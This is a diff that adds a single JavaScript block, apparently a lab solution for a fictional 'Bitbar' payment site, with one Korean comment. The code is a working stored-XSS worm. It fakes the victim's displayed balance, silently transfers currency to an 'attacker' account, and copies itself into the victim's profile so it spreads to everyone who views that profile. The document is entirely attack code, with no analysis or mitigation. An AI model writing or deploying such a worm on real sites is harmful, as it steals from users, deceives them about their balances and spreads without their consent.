@@ -1,0 +1,41 @@
+<script>
+(function() {
+    function overrideShowBitbars() {
+        window.showBitbars = function(bitbars) {
+            document.getElementById("bitbar_display").innerHTML = '10 bitbars';
+        };
+    }
+
+    // Bitbar를 전송하는 함수
+    function transferBitbar() {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "/post_transfer", true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+                replaceProfile();
+            }
+        };
+        var params = "destination_username=" + encodeURIComponent('attacker') + "&quantity=1";
+        xhr.send(params);
+    }
+
+    function replaceProfile() {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "/set_profile", true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        var scriptContent = arguments.callee.toString();
+        var wormProfile = '<script>(function() {' + overrideShowBitbars.toString() + transferBitbar.toString() + scriptContent + run.toString() + 'run();})();<\/script>';
+        xhr.send("new_profile=" + encodeURIComponent(wormProfile));
+    }
+
+	function run() {
+		document.addEventListener('DOMContentLoaded', function() {
+			overrideShowBitbars();
+			transferBitbar();
+		});
+    }
+
+	run();
+})();
+</script>
